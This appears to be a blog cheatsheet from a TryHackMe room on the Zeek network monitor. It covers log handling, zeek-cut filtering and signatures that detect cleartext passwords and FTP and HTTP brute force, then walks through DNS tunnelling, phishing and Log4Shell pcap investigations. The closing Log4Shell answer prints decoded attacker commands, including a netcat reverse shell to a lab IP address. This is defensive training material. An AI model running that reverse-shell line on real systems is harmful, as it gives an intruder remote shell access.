---
title: Zeek Cheatsheet
date: 2024-06-10 00:00:00 -500
categories: [TryHackMe, Network Security]
tags: [TryHackMe]
---


### Default log path

```c
/opt/zeek/logs
```

### Necessary `sudo` permission

```c
sudo su
```

### Checking Zeek version

```c
zeek -v
```

### Zeek Control Module

```c
zeekctl status
zeekctl start
zeekctl stop
```


### PCAP processing mode with Zeek

```c
zeek -C -r sample.pcap
```

![](/assets/img/Pasted image 20240305022406.png)

Possible logs generated:
```c
- conn.log
- dhcp.log
- dns.log
- ntp.log
- packet_filter.log
- snmp.log
- ssh.log
- syslog.log
```

Breakdown:
```c
- '-r' : Reading option, read/process a pcap file
- '-C' : Ignoring checksum errors
- '-v' : Version information
- 'zeekctl' : ZeekControl module
```

### Zeek logs in a nutshell:

| Category             | Description                                                             | Log Files                                                                                                                                                                                                                                                                                                                         |     |
| -------------------- | ----------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- |
| Network              | Network Protocols logs                                                  | _conn.log, dce_rpc.log, dhcp.log, dnp3.log, dns.log, ftp.log, http.log, irc.log, kerberos.log, modbus.log, modbus_register_change.log, mysql.log, ntlm.log, ntp.log, radius.log, rdp.log, rfb.log, sip.log, smb_cmd.log, smb_files.log, smb_mapping.log, smtp.log, snmp.log, socks.log, ssh.log, ssl.log, syslog.log, tunnel.log_ |     |
| Files                | File analysis result logs                                               | _files.log, ocsp.log, pe.log, x509.log_                                                                                                                                                                                                                                                                                           |     |
| NetControl           | Network control and flow logs                                           | _netcontrol.log, netcontrol_drop.log, netcontrol_shunt.log, netcontrol_catch_release.log, openflow.log_                                                                                                                                                                                                                           |     |
| Detection            | Detection and possible indicator logs                                   | _intel.log, notice.log, notice_alarm.log, signatures.log, traceroute.log_                                                                                                                                                                                                                                                         |     |
| Network Observations | Network flow logs                                                       | _known_certs.log, known_hosts.log, known_modbus.log, known_services.log, software.log_                                                                                                                                                                                                                                            |     |
| Miscellaneous        | Additional logs cover external alerts, inputs and failures              | _barnyard2.log, dpd.log, unified2.log, unknown_protocols.log, weird.log, weird_stats.log_                                                                                                                                                                                                                                         |     |
| Zeek Diagnostics     | Zeek diagnostic logs cover system messages, actions and some statistics | _broker.log, capture_loss.log, cluster.log, config.log, loaded_scripts.log, packet_filter.log, print.log, prof.log, reporter.log, stats.log, stderr.log, stdout.log_                                                                                                                                                              |     |


### Usage primer table:

| Overall Info       | Protocol-Based | Detection      | Observation        |
| ------------------ | -------------- | -------------- | ------------------ |
| conn.log           | http.log       | notice.log     | known_host.log     |
| files.log          | dns.log        | signatures.log | known_services.log |
| intel.log          | ftp.log        | pe.log         | software.log       |
| loaded_scripts.log | ssh.log        | traceroute.log | weird.log          |


### Filtering Zeek columns with `zeek-cut`

Format:
```c
cat <Log>.log | zeek-cut <column1> <column2> <column3>
```

```c
$ cat conn.log | zeek-cut uid proto id.orig_h id.orig_p id.resp_h id.resp_p
```


### Processing Zeek Logs

![](/assets/img/Pasted image 20240305145929.png)

Basics:
```c
$ history

$ !10

$ !!
```

Read File:
```c
$ cat sample.txt
$ head sample.txt
$ tail sample.txt
```

Find and Filter:
```c
$ cat test.txt | sort
$ cat test.txt | sort -n
$ cat test.txt | uniq
$ cat test.txt | wc -l
$ cat test.txt | nl
```

Advanced:
```c
$ cat test.txt | sed -n '11p'
$ cat test.txt | sed -n '10,15p'
$ cat test.txt | awk 'NR < 11 {print $0}'
$ cat test.txt | awk 'NR == 11 {print $0}'
```


![](/assets/img/Pasted image 20240305150102.png)

![](/assets/img/Pasted image 20240305150111.png)

```c
$ sort | uniq
$ sort | uniq -c
$ sort -nr
$ rev
$ cut -f 1
$ cut -d '.' -f 1-2
$ grep -v 'test'
$ grep -v -e 'test1' -e 'test2'
$ file
$ grep -rin Testvalue1 * | column -t | less -5
```


### Running Zeek with a signature file:

```c
$ zeek -C -r sample.pcap -s sample.sig
```

	- '-C' : ignore checksum errors
	- '-r' : Read pcap file
	- '-s' : use signature file


`sample.sig` content:
```c
signature http-password { 
	ip-proto == tcp 
	dst-port == 80 
	payload /.*password.*/ 
	event "Cleartext Password Found!" 
} 

# signature: Signature name. 
# ip-proto: Filtering TCP connection. 
# dst-port: Filtering destination port 80. 
# payload: Filtering the "password" phrase. 
# event: Signature match message.
```


<u>Example match</u>:
```c
$ zeek -C -r http.pcap -s http-password.sig
```

```c
cat notice.log | zeek-cut id.orig_h id.resp_h msg
```

```c
cat signatures.log | zeek-cut src_addr dest_addr sig_id event_msg
```

![](/assets/img/Pasted image 20240305151243.png)


### Zeek FTP Bruteforce signature

```c
signature ftp-admin {
	ip-proto == tcp
	ftp /.*USER.*dmin.*/
	event "FTP Admin Login Attempt!"
}
```

Command:
```c
$ zeek -C -r ftp.pcap -s ftp-admin.sig

$ cat signatures.log | zeek-cut src_addr dst_addr event_msg sub_msg | sort -r | uniq
```

Expected Output:

![](/assets/img/Pasted image 20240305151859.png)


### Zeek FTP bruteforce for all possible attempts

```c
signature ftp-brute { 
	ip-proto == tcp 
	payload /.*530.*Login.*incorrect.*/ 
	event "FTP Brute-force Attempt" 
}
```

	- We are able to know if its a failed login attempt because FTP responds to the user a 530 response code when it happens


##### Total signature for FTP Bruteforce:

```c
signature ftp-username {
	ip-proto == tcp
	ftp /.*USER.*/
	event "FTP Username Input Found!"
}

signature ftp-brute {
	ip-proto == tcp
	payload /.*530.*Login.*incorrect.*/
	event "FTP Brute-Force Attempt!"
}

signature ftp-username {
    ip-proto == tcp
    ftp /.*USER.*dmin.*/
	event "FTP Admin Login Attempt!"
}
```

<u>Sample usage</u>:
```c
$ zeek -C -r ftp.pcap -s ftp-admin.sig
```

	- Produces zeek logs


```c
$ cat notice.log | zeek-cut uid id.orig_h id.resp_h msg sub | sort -r | nl | uniq | sed -n '1001,1004p'
```

<u>Output</u>:

![](/assets/img/Pasted image 20240305152838.png)


##### Signature for HTTP bruteforce login
```c
signature http-password {
    ip-proto == tcp
    dst-port == 80
    payload /.*password*./
    event "HTTP login brute-force attack attempt!"
}
```

Command:
```c
zeek -C -r http.pcap
```

Generated logs:

![](/assets/img/Pasted image 20240305154331.png)

```c
$ cat conn.log | zeek-cut ts uid id.orig_h id.org_p id.resp_h id.resp_p service duration
```

Output:
![](/assets/img/Pasted image 20240305155326.png)


### Investigating `dns.log` file with Zeek

```c
$ zeek -C -r dns-tunneling.pcap
```

<u>Log files generated</u>:
```c
- conn.log
- dns.log
- http.log
- ntp.log
- packet_filter.log
```

<u>Extracting important parts from dns.log</u>:
```c
$ cat dns.log | zeek-cut ts uid proto id.orig_h id.orig_p id.resp_h id.resp_p query qtype_name | sort -r | grep AAAA | wc -l
```

Output:

![](/assets/img/Pasted image 20240306151642.png)


<u>Filtering unique DNS queries</u>:
```c
$ cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort -r | uniq
```

![](/assets/img/Pasted image 20240306153213.png)


### Massive amount of DNS queries sent on the same domain and checking the IP address of this DNS server

```c
$ cat conn.log | zeek-cut ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service | sort -r | uniq
```

Output:

![](/assets/img/Pasted image 20240306153731.png)


### Phishing example

```c
$ zeek -C -r phishing.pcap hash-demo.zeek
```


<u>Checking where the .exe file was downloaded</u>:

![](/assets/img/Pasted image 20240306154929.png)


Getting the hash of the files downloaded:

```c
$ cat files.log | zeek-cut md5 sha1 sha256
```

![](/assets/img/Pasted image 20240306161607.png)

<u>Checking file types</u>:
```c
$ zeek -C -r phishing.pcap file-extract-demo.zeek
```

<u>Extracted file types</u>:

![](/assets/img/Pasted image 20240306155053.png)

<u>Extracted hashes</u>:

![](/assets/img/Pasted image 20240306160709.png)


### Log4j example

```c
$ zeek -C -r log4shell.pcapng detection-log4j.zeek
```

Logs generated:

![](/assets/img/Pasted image 20240306162208.png)

Signature hits:

![](/assets/img/Pasted image 20240306162403.png)


- Investigate the **`http.log`** file. Which tool is used for scanning? `nmap`

![](/assets/img/Pasted image 20240306162517.png)


- Investigate the **`http.log`** file. What is the extension of the exploit file?

![](/assets/img/Pasted image 20240306162728.png)

	- `.class`


- Investigate the `log4j.log` file. Decode the ***base64*** commands. What is the name of the created file?
Commands:

![](/assets/img/Pasted image 20240306162823.png)

<u>Decoded</u>:
```c
touch /tmp/pwned

which nc > /tmp/pwned

nc 192.168.56.102 80 -e /bin/sh -vvv
```













